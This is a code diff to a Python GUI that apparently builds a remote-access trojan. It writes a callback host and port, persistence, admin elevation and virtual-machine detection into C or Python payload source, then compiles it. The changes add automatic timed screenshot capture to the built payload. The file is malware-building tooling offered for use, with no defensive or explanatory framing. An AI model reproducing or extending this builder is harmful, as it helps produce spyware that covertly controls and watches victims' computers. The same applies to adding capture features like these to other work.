@@ -84,6 +84,12 @@ class FrameTabCompile(ck.CTkFrame):
             values=['False', 'True']
         )
 
+        self.label_entry_auto_screenshot = ck.CTkLabel(self, text='Auto Screenshot')
+        self.entry_auto_screenshot = ck.CTkOptionMenu(
+            self,
+            values=['False', 'True']
+        )
+
         self.label_entry_compiler = ck.CTkLabel(self, text='Compiler')
         self.entry_compiler = ck.CTkOptionMenu(
             self,
@@ -96,11 +102,14 @@ class FrameTabCompile(ck.CTkFrame):
         self.label_entry_port = ck.CTkLabel(self, text='Port')
         self.entry_port = ck.CTkEntry(self)
 
-        self.label_entry_filename = ck.CTkLabel(self, text='Output Filename')
-        self.entry_filename = ck.CTkEntry(self)
+        self.label_entry_time_screenshot = ck.CTkLabel(self, text='Time Auto Screenshot')
+        self.entry_time_screenshot = ck.CTkEntry(self)
 
         self.label_entry_source_file = ck.CTkLabel(self, text='Source File')
         self.entry_source_file = ck.CTkEntry(self)
+
+        self.label_entry_filename = ck.CTkLabel(self, text='Output Filename')
+        self.entry_filename = ck.CTkEntry(self)
 
         self.label_entry_autorun.grid(column=0, row=0, padx=6, pady=10)
         self.entry_autorun.grid(column=1, row=0, padx=6, pady=10)
@@ -113,17 +122,21 @@ class FrameTabCompile(ck.CTkFrame):
         self.entry_vm.grid(column=1, row=1, padx=6, pady=10)
         self.label_entry_compiler.grid(column=2, row=1, padx=6, pady=10)
         self.entry_compiler.grid(column=3, row=1, padx=6, pady=10)
+        self.label_entry_auto_screenshot.grid(column=4, row=1, padx=6, pady=10)
+        self.entry_auto_screenshot.grid(column=5, row=1, padx=6, pady=10)
 
         self.label_entry_host.grid(column=0, row=2, padx=6, pady=10)
         self.entry_host.grid(column=1, row=2, padx=6, pady=10)
         self.label_entry_port.grid(column=2, row=2, padx=6, pady=10)
         self.entry_port.grid(column=3, row=2, padx=6, pady=10)
-        self.label_entry_filename.grid(column=4, row=2, padx=6, pady=10)
-        self.entry_filename.grid(column=5, row=2, padx=6, pady=10)
+        self.label_entry_time_screenshot.grid(column=4, row=2, padx=6, pady=10)
+        self.entry_time_screenshot.grid(column=5, row=2, padx=6, pady=10)
 
         self.label_entry_source_file.grid(column=0, row=3, padx=6, pady=10)
         self.entry_source_file.bind("<Button-1>", command=self.set_file)
         self.entry_source_file.grid(column=1, row=3, padx=6, pady=10)
+        self.label_entry_filename.grid(column=2, row=3, padx=6, pady=10)
+        self.entry_filename.grid(column=3, row=3, padx=6, pady=10)
 
     def set_file(self, _):
         source_file = fd.askopenfilename(initialdir='./source', title='Open File', filetypes=(("All Files", "*.*"),))
@@ -666,6 +679,8 @@ class Application(ck.CTk):
         activate = self.tab_view.frame_compile.entry_activate.get()
         admin = self.tab_view.frame_compile.entry_admin.get()
         detect = self.tab_view.frame_compile.entry_vm.get()
+        auto_screenshot = self.tab_view.frame_compile.entry_auto_screenshot.get()
+        time_screenshot = self.tab_view.frame_compile.entry_time_screenshot.get()
 
         if admin != "False" and admin != "True":
             admin = "False"
@@ -682,6 +697,8 @@ class Application(ck.CTk):
                 f'PERSIST = {autorun or "False"}\n'
                 f'ADMIN = {admin or "False"}\n'
                 f'DETECT_VM = {detect or "False"}\n'
+                f'AUTO_SCREENSHOT = {auto_screenshot or "False"}\n'
+                f'TIME_SCREENSHOT = {time_screenshot or 5}\n'
             )
 
             args = [
@@ -705,10 +722,12 @@ class Application(ck.CTk):
             writer = (
                 f'#define HOST "{host}"\n'
                 f'#define PORT {port or 555}\n'
-                f'#define ACTIVATE {activate.lower() or "False"}\n'
-                f'#define PERSIST {autorun.lower() or "False"}\n'
-                f'#define ADMIN {admin.lower() or "False"}\n'
-                f'#define DETECT_VM {detect.lower() or "False"}\n'
+                f'#define ACTIVATE {activate.lower() or "false"}\n'
+                f'#define PERSIST {autorun.lower() or "false"}\n'
+                f'#define ADMIN {admin.lower() or "false"}\n'
+                f'#define DETECT_VM {detect.lower() or "false"}\n'
+                f'#define AUTO_SCREENSHOT {auto_screenshot.lower() or "false"}\n'
+                f'#define TIME_SCREENSHOT {time_screenshot or 5}\n'
             )
             args = ["gcc", "-v", os.path.join(working_dir, source_file), "-o", os.path.join(dist_dir, filename)]
             if eval(admin):
@@ -724,10 +743,12 @@ class Application(ck.CTk):
             writer = (
                 f'#define HOST "{host}"\n'
                 f'#define PORT {port or 555}\n'
-                f'#define ACTIVATE {activate.lower() or "False"}\n'
-                f'#define PERSIST {autorun.lower() or "False"}\n'
-                f'#define ADMIN {admin.lower() or "False"}\n'
-                f'#define DETECT_VM {detect.lower() or "False"}\n'
+                f'#define ACTIVATE {activate.lower() or "false"}\n'
+                f'#define PERSIST {autorun.lower() or "false"}\n'
+                f'#define ADMIN {admin.lower() or "false"}\n'
+                f'#define DETECT_VM {detect.lower() or "false"}\n'
+                f'#define AUTO_SCREENSHOT {auto_screenshot.lower() or "false"}\n'
+                f'#define TIME_SCREENSHOT {time_screenshot or 5}\n'
             )
 
             os_unit = os.path.splitdrive(os.getcwd())[0]
